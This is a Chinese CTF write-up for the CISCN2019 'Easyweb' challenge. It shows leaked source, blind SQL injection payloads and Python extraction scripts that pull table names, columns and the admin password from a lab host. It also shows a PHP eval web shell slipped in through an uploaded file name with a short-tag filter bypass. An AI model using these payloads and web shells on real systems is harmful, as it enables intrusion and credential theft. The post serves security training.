---
title: '[CISCN2019 总决赛 Day2 Web1]Easyweb'
date: 2024-06-11 14:16:03
tags: 
      - 文件包含
      - sql注入
categories: 刷题笔记
---

### [CISCN2019 总决赛 Day2 Web1]Easyweb（源码泄露&盲注&日志包含）

我们打开源码，发现存在个参数id

![image-20240611152518365](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406111525469.png)

我们对id进行注入点测试，没啥用，然后我们对目录进行扫描，发现存在一个robots.txt文件，我们访问它

<!--more-->

![image-20240611152639303](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406111526357.png)

发现其存在`*.php.bak`备份文件，其网站存在`index.php`、`image.php`、`user.php`都对其进行访问

经过访问，我们成功下载下来image.php.bak文件

```
<﻿?php
include "config.php";

$id=isset($_GET["id"])?$_GET["id"]:"1";
$path=isset($_GET["path"])?$_GET["path"]:"";

$id=addslashes($id);
$path=addslashes($path);

$id=str_replace(array("\\0","%00","\\'","'"),"",$id);
$path=str_replace(array("\\0","%00","\\'","'"),"",$path);

$result=mysqli_query($con,"select * from images where id='{$id}' or path='{$path}'");
$row=mysqli_fetch_array($result,MYSQLI_ASSOC);

$path="./" . $row["path"];
header("Content-Type: image/jpeg");
readfile($path);

```

然后就是进行代码审计了

源码分析：

- GET方式传入变量id的值，若没有则为1
- GET方式传入变量path的值，若没有则为空
- addslashes() 函数返回在预定义字符之前添加反斜杠的字符串，单引号（'）、双引号（"）、反斜杠（\）
- str_replace()函数将两个变量内的\0、%00、\'、'都替换为空
- 将变量\$id与$path拼接进SQL语句

本地测试：

```
<?php
    $id = "\\0";
    echo $id.'<br>';
	$id = addslashes($id);
	echo $id.'<br>';
	$id=str_replace(array("\\0","%00","\\'","'"),"",$id);
	echo $id;
?>

```

得到结果

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201209122733325.png)

也就是说，`\\0`在传入变量`$id`的值后，首先被转义为`\0`，再经过`addslashes()`函数的处理，变量`$id="\\0"`，再由`str_replace()`函数的替换，最终变为`\`。

sql语句变为

```
select * from images where id='\' or path='{$path}'

```

其中`\'`变成了字符串包含在两侧的`'`单引号中，即变量`$id`的值为：`\' or path=`

之后就可以从`{$path}`处拼接SQL语句，但没有查询结果回显，所以尝试盲注，通过猜测数据库名长度，构造**Payload**以验证猜想：

```
?id=\\0&path=or 1=if(length(database())>1,1,-1)%23

```

![image-20240611154431801](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406111544276.png)

成功回显，说明猜想是正确的

接下来就是sql盲注了，我们使用python脚本

先**爆表**

payload

```
if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database() ),0,1))=1,1,-1)%23

```



```
import requests


url = 'http://44c9cc3b-aa02-4f64-b4ab-9e2cca44b58c.node3.buuoj.cn/image.php?id=\\0&path=or 1='
flag = ''
table_name = ''

for i in range(1, 50):
    for c in range(127, 0, -1):
        payload = 'if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database() ),%d,1))=%d,1,-1)%%23' % (i, c)
        r = requests.get(url+payload)

        if "JFIF" in r.text:
            table_name += chr(c)
            print(table_name)
            break

```

![image-20240611154826309](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406111548330.png)

再**爆字段**

因为过滤了`'`单、`"`双引号，所以需要将字符串转换成**十六进制**：

payload

```
if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=0x7573657273 ),0,1))=1,1,-1)%23

```

```
import requests


url = 'http://44c9cc3b-aa02-4f64-b4ab-9e2cca44b58c.node3.buuoj.cn/image.php?id=\\0&path=or 1='
flag = ''
column_name = ''

for i in range(1, 50):
    for c in range(127, 0, -1):
        payload = 'if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=0x7573657273 ),%d,1))=%d,1,-1)%%23' % (i, c)
        r = requests.get(url+payload)

        if "JFIF" in r.text:
            column_name += chr(c)
            print(column_name)
            break

```

![image-20240611155232786](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406111552853.png)

爆**数据**

```
import  requests
url = "http://acf6a847-2c9b-4bbf-9128-2fffe272b464.node3.buuoj.cn/image.php?id=\\0&path="
payload = " or ascii(substr((select password from users),{},1))>{}%23"
result = ''
for i in range(1,100):
    high = 127
    low = 32
    mid = (low+high) // 2
    # print(mid)
    while(high>low):
        r = requests.get(url + payload.format(i,mid))
       # print(url + payload.format(i,mid))
        if 'JFIF' in r.text:
            low = mid + 1
        else:
            high = mid
        mid = (low + high) // 2
    result += chr(mid)
    print(result)

```

密码就把group_concat(username)改为group_concat(password)

结果为：

账号是admin

密码是d2a6e76d0e6b8bc92784

我们进行登录

进入到新页面后，我们进行文件上传

![image-20240611161044590](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406111610619.png)

上传后，页面提示将文件名记录在日志中

![image-20240611161141003](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406111611035.png)

我们通过文件名写入一句话木马

```
<?php @eval($_POST['1']); ?>
```

抓包，修改filename

![image-20240611161333133](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406111613200.png)

页面提示不能上传php文件，但我们并没有上传php文件，我们猜测可能是一句话木马中的php被过滤了，我们使用短标签

```
<?= @eval($_POST['1']); ?>
```

![image-20240611161531470](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406111615657.png)

成功上传，上传路径已经给我们了，然后我们使用蚁剑进行连接

![image-20240611161613497](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406111616561.png)

连接成功，得到flag

![image-20240611161700513](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406111617574.png)
